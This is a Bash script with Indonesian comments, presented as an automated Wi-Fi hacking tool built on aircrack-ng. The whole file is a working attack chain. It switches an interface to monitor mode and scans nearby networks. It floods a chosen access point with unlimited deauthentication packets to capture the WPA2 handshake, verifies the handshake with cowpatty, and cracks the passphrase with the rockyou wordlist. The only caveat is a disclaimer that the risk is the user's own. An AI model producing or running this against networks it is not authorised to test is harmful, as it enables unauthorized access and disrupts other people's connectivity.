#!/bin/bash
# --------------------------------------------------
#
# * fwifi.sh
# * Script Bash untuk Hack Wi-Fi secara otomatis.
# * Dibuat oleh: Rofi (Fixploit03)
# * Github: https://github.com/fixploit03/fwifi
#
# --------------------------------------------------
# Script ini ditenagai tools Aircrack-ng
# Github: https://github.com/aircrack-ng/aircrack-ng
# --------------------------------------------------
#
# Resikone ditanggung dewe.
# Ngerti ora kowe?
#
# --------------------------------------------------

# Fungsi untuk cek root 'pastikan script ini dijalankan sebagai root' (OK)
function cek_root(){
        if [[ $EUID -ne 0 ]]; then
                echo "[-] Script ini harus dijalankan sebagai root."
                exit 1
        fi
}

# Fungsi untuk cek alat (OK)
function cek_alat(){

        daftar_alat_yang_belum_terinstal=()

        daftar_alat=(
                "aircrack-ng"
                "iwconfig"
                "cowpatty"
        )

        for cek_alat in "${daftar_alat[@]}"; do
                if [[ ! $(command -v "${cek_alat}") ]]; then
                        daftar_alat_yang_belum_terinstal+=("${cek_alat}")
                fi
        done

        if [[ "${#daftar_alat_yang_belum_terinstal[@]}" -gt 0 ]]; then
                if [[ "${#daftar_alat_yang_belum_terinstal[@]}" -eq 1 ]]; then
                        echo "[-] Script ini tidak dapat dijalankan karena ada alat yang belum terinstal."
                        echo ""
                        echo "Alat yang belum terinstal:"
                        echo ""
                        echo "${daftar_alat_yang_belum_terinstal[0]}"
                        exit 1
                else
                        echo "[-] Script ini tidak dapat dijalankan karena ada beberapa alat yang belum terinstal."
                        echo ""
                        echo "Alat-alat yang belum terinstal:"
                        echo ""
                        for alat_belum_terinstal in "${daftar_alat_yang_belum_terinstal[@]}"; do
                                echo "- ${alat_belum_terinstal}"
                        done
                        exit 1
                fi
        fi

}

# Fungsi untuk cek folder yang digunakan sebagai tempan menyimpan hasil capture handshake (OK)
function cek_folder(){
        nama_folder="hasil capturte"
        if [[ ! -d "${nama_folder}" ]]; then
                echo "[*] Folder '${nama_folder}' belum ada."
                echo "[*] Membuat folder '${nama_folder}'..."
                mkdir "${nama_folder}"
                if [[ $? -eq 0 ]]; then
                        echo "[+] Folder '${nama_folder}' berhasil dibuat."
                        echo "[*] Tunggu beberapa saat."
                        sleep 3
                else
                        echo "[-] Folder '${nama_folder}' gagal dibuat."
                        echo "[-] Keluar."
                        exit 1
                fi
        fi
}

# Fungsi untuk menampilkan waktu saat ini dalam bahasa indonesia (OK)
function menampilkan_waktu_saat_ini(){
        hari=$(date +%A)

        if [[ "${hari}" == "Monday" ]]; then
                hari="Senin"
        elif [[ "${hari}" == "Tuesday" ]]; then
                hari="Selasa"
        elif [[ "${hari}" == "Wednesday" ]]; then
                hari="Rabu"
        elif [[ "${hari}" == "Thursday" ]]; then
                hari="Kamis"
        elif [[ "${hari}" == "Friday" ]]; then
                hari="Jumat"
        elif [[ "${hari}" == "Saturday" ]]; then
                hari="Sabtu"
        elif [[ "${hari}" == "Sunday" ]]; then
                hari="Minggu"
        fi

        tanggal=$(date +%e)

        bulan=$(date +%B)

        if [[ "${bulan}" == "January" ]]; then
                bulan="Januari"
        elif [[ "${bulan}" == "February" ]]; then
                bulan="Februari"
        elif [[ "${bulan}" == "March" ]]; then
                bulan="Maret"
        elif [[ "${bulan}" == "April" ]]; then
                 bulan="April"
        elif [[ "${bulan}" == "May" ]]; then
                bulan="Mei"
        elif [[ "${bulan}" == "June" ]]; then
                bulan="Juni"
        elif [[ "${bulan}" == "July" ]]; then
                bulan="Juli"
        elif [[ "${bulan}" == "August" ]]; then
                bulan="Agustus"
        elif [[ "${bulan}" == "September" ]]; then
                bulan="September"
        elif [[ "${bulan}" == "October" ]]; then
                bulan="Oktober"
        elif [[ "${bulan}" == "November" ]]; then
                bulan="November"
        elif [[ "${bulan}" == "December" ]]; then
                bulan="Desember"
        fi

        tahun=$(date +%Y)

        jam=$(date +"%H:%M:%S")

        echo "[${hari}, ${tanggal} ${bulan} ${tahun} - ${jam}]"
        echo ""

}

# Fungsi untuk menampilkan banner (OK)
function show_banner(){
        clear
        menampilkan_waktu_saat_ini
        echo "███████╗██╗    ██╗██╗███████╗██╗"
        echo "██╔════╝██║    ██║██║██╔════╝██║"
        echo "█████╗  ██║ █╗ ██║██║█████╗  ██║"
        echo "██╔══╝  ██║███╗██║██║██╔══╝  ██║"
        echo "██║     ╚███╔███╔╝██║██║     ██║"
        echo "╚═╝      ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝"
        echo ""
        echo "[*] Script Bash untuk Hack Wi-Fi secara otomatis."
        echo "[*] Dibuat oleh: Rofi (Fixploit03)"
        echo "[*] Github: https://github.com/fixploit03/fwifi"
        echo ""
}

# Fungsi untuk memilih atau menentukan interface yang ingin digunakan dalam proses hacking wi-fi (OK)
function pilih_interface(){
        echo "[*] Mengecek interface yang tersedia..."
        sleep 3
        daftar_interface=($(iw dev | awk '/Interface/{print $2}'))
        if [[ "${#daftar_interface[@]}" -eq 0 ]]; then
                echo "[-] Tidak ada interface yang ditemukan."
                echo "[-] Keluar."
                exit 1
        fi
        echo "[+] Interface yang ditemukan:"
        echo ""
        for interface in "${daftar_interface[@]}"; do
                echo "- ${interface}"
        done
        echo ""
        while true; do
                read -p "[#] Pilih interface yang ingin digunakan: " pilih_interface
                if printf "%s\n" "${daftar_interface[@]}" | grep -qx "${pilih_interface}"; then
                        echo "[+] Interface -> ${pilih_interface}"
                        break
                else
                        echo "[-] Interface tidak ditemukan. Silahkan pilih lagi."
                        continue
                fi
        done
}

# Fungsi untuk mengecek mode pada interface yang dipilih, apakah sudah dalam mode monitor atau tidak (OK)
function cek_mode_interface(){
        echo "[*] Mengecek mode interface '${pilih_interface}'..."
        sleep 3
        if iwconfig "${pilih_interface}" | grep -qi "monitor"; then
                echo "[+] Interface '${pilih_interface}' sudah dalam mode monitor."
        else
                echo "[-] Interface '${pilih_interface}' belum dalam mode monitor."
                aktifkan_mode_monitor
        fi
}

# Fungsi untuk mengaktifkan mode monitor jika interface belum dalam mode monitor (OK)
function aktifkan_mode_monitor(){
        echo "[*] Mengaktifkan mode monitor pada interface '${pilih_interface}'..."
        sleep 3
        airmon-ng check kill &>/dev/null
        airmon-ng start "${pilih_interface}" &>/dev/null
        if iwconfig "${pilih_interface}" | grep -qi "monitor"; then
                echo "[+] Mode monitor berhasil diaktifkan pada interface '${pilih_interface}'."
        else
                echo "[-] Mode monitor gagal diaktifkan pada interface '${pilih_interface}'."
                echo "[-] Keluar."
                exit 1
        fi
}

# Fungsi untuk memindai atu scanning Wi-Fi yang ada disekitar kita (OK)
function scan_target(){
        echo "[*] Memindai jaringan Wi-Fi yang ada disekitar (Tekan CTRL+C untuk menghentikan pemindaian)..."
        sleep 3
        airodump-ng "${pilih_interface}"
        echo ""
}

# Fungsi untuk menangkap handshake yang nantinya bakal dicrack pake aircrack
function capture_handshake(){
        # set ssid (OK)
        # ESSID itu nama dari Wi-Fi nya
        while true; do
                read -p "[#] Masukkan ESSID target yang ingin diserang: " essid_target
                if [[ -z "${essid_target}" ]]; then
                        echo "[-] ESSID tidak boleh kosong."
                        continue
                fi
                echo "[+] ESSID -> ${essid_target}"
                break
        done

        # set bssid (OK)
        # BSSID itu alamat MAC dari si AP (Access Point) misalnya 'AB:11:GG:11:34:11'
        while true; do
                read -p "[#] Masukkan BSSID target yang ingin diserang: " bssid_target
                if [[ -z "${bssid_target}" ]]; then
                        echo "[-] BSSID tidak boleh kosong."
                        continue
                fi
                if ! [[ "${bssid_target}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                        echo "[-] Format BSSID tidak valid harap masukkan dengan format (XX:XX:XX:XX:XX:XX)."
                        continue
                fi
                echo "[+] BSSID -> ${bssid_target}"
                break
        done

        # set channel (OK)
        # Channel itu nomor saluran dari AP (Access Point) misalnya untuk 2.4 GHz dari 1-14
        while true; do
                read -p "[#] Masukkan Channel dari BSSID yang ingin diserang: " channel_target
                if [[ -z "${channel_target}" ]]; then
                        echo "[-] Channel tidak boleh kosong."
                        continue
                fi
                if ! [[ "${channel_target}" =~ ^[0-9]+$ ]]; then
                        echo "[-] Channel harus berupa angka."
                        continue
                fi
                echo "[+] Channel -> ${channel_target}"
                break
        done

        # set waktu mencapture handshake (OK)
        while true; do
                read -p "[#] Berapa lama waktu Anda ingin mencapture handshake (detik): " lama_waktu
                if [[ -z "${lama_waktu}" ]]; then
                        echo "[-] Lama waktu tidak boleh kosong."
                        continue
                fi
                if ! [[ "${lama_waktu}" =~ ^[0-9]+$ ]]; then
                        echo "[-] Lama waktu harus berupa angka."
                        continue
                fi
                echo "[+] Lama waktu capture handshake -> ${lama_waktu} detik"
                break
        done

        # set nama file capture (OK)
        while true; do
                read -p "[#] Masukkan nama file untuk menyimpan hasil capture handshake: " file_capture
                if [[ -z "${file_capture}" ]]; then
                        echo "[-] Nama file capture tidak boleh kosong."
                        continue
                fi
                echo "[+] Nama file capture -> ${file_capture}-01.cap"
                break
        done

        path="${nama_folder}/${file_capture}"

        echo "[*] Mencapture handshake untuk ESSID '${essid_target}'..."
        sleep 3
        xterm -geometry 100x20+0+0 -e airodump-ng --bssid "${bssid_target}" --channel "${channel_target}" --write "${path}" "${pilih_interface}" &
        sleep 2
        xterm -geometry 100x20+0+300 -e aireplay-ng -0 0 -a "${bssid_target}" "${pilih_interface}" &
        sleep "${lama_waktu}"
        pkill -P $$ xterm
        echo "[*] Proses capture handshake selesai."
        echo "[*] File capture disimpan di: ${path}-01.cap"
}

# Fungsi untuk memverifikasi hasil hasndshake yang ditangkap (OK)
function verifikasi_hasil_capture(){
        echo "[*] Memverifikasi handshake yang di capture..."
        sleep 3
        cek_handshake=$(cowpatty -r "${path}-01.cap" -s "${essid_target}" -c)

        if echo "${cek_handshake}" | grep -qi "Collected all necessary data to mount crack against WPA2/PSK passphrase."; then
                echo "[+] Handshake yang di capture valid dan dapat dicrack."
        else
                echo "[-] Handshake tidak valid atau tidak lengkap."
                echo "[-] Keluar."
                exit 1
        fi
}

# Fungsi untuk mengembalikan interface ke mode managed agar bisa internetan lagi (OK)
function clean_up(){
        echo "[*] Mengubah kembali interface '${pilih_interface}' ke mode managed..."
        sleep 3
        airmon-ng stop "${pilih_interface}" &>/dev/null
        if iwconfig "${pilih_interface}" | grep -qi "managed"; then
                echo "[+] Berhasil mengubah interface '${pilih_interface}' ke mode managed."
        else
                echo "[-] Gagal mengubah interface '${pilih_interface}' ke mode managed."
                echo "[-] Keluar."
                exit 1
        fi

        echo "[*] Merestart NetworkManager..."
        sleep 3
        systemctl restart NetworkManager
        if [[ $? -eq 0 ]]; then
                echo "[+] NetworkManager berhasil direstart."
                exit 0
        else
                echo "[-] NetworkManager gagal direstart."
                echo "[-] Keluar"
                exit 1
        fi


}

# Fungsi untuk mengcrack WPA2/PSK passphrase (OK)
function crack_passpharase(){
        rockyou="/usr/share/wordlists/rockyou.txt"
        while true; do
                read -p "[#] Mau menggunakan file Wordlist default '${rockyou}' [Y/n]: " nanya_wordlist
                if [[ -z "${nanya_wordlist}" ]]; then
                        echo "[-] Input tidak boleh kosong. Harap masukkan 'Y/n'."
                        continue
                fi
                if [[ "${nanya_wordlist}" == "y" || "${nanya_wordlist}" == "Y" ]]; then
                        if [[ ! -f "${rockyou}" ]]; then
                                echo "[-] File Wordlist '${rockyou}' tidak ditemukan."
                                exit 1
                        fi
                        echo "[*] Mengcrack WPA2/PSK passphrase menggunakan file Wordlist '${rockyou}'..."
                        sleep 3
                        aircrack-ng -a2 "${path}-01.cap" -w "${rockyou}" -b "${bssid_target}" -e "${essid_target}"
                        echo "[*] Proses crack WPA2/PSK passphrase selesai."
                        clean_up
                        break
                elif [[ "${nanya_wordlist}" == "n" || "${nanya_wordlist}" == "N" ]]; then
                        while true; do
                                read -p "[#] Masukkan nama file Wordlist: " file_wordlist
                                if [[ -z "${file_wordlist}" ]]; then
                                        echo "[-] Nama file Wordlist tidak boleh kosong."
                                        continue
                                fi
                                if [[ ! -f "${file_wordlist}" ]]; then
                                        echo "[-] File Wordlist '${file_wordlist}' tidak ditemukan." continue
                                fi
                                echo "[*] Mengcrack WPA2/PSK passphrase menggunakan file Wordlist ${file_wordlist}..."
                                sleep 3
                                aircrack-ng  -a2 "${path}-01.cap" -w "${file_wordlist}" -b "${bssid_target}" -e "${essid_target}"
                                echo "[*] Proses crack WPA2/PSK passphrase selesai."
                                clean_up
                                break
                        done
                        break
                else
                        echo "[-] Input tidak valid. Harap masukkan 'Y/n'."
                        continue
                fi
        done
}

# Fungsi utama script
function main(){
        # manggil fungsi cek_root
        cek_root
        # manggil fungsi cek_alat
        cek_alat
        # manggil fungsi cek_folder
        cek_folder
        # manggil fungsi show_banner
        show_banner
        # manggil fungsi pilih_interface
        pilih_interface
        # manggil fungsi cek_mode_interface
        cek_mode_interface
        # manggil fungsi scan_target
        scan_target
        # manggil fungsi capture_handshake
        capture_handshake
        # manggil fungsi verifikasi_hasil_capture
        verifikasi_hasil_capture
        # manggil fungsi crack_passpharase
        crack_passpharase
}

main
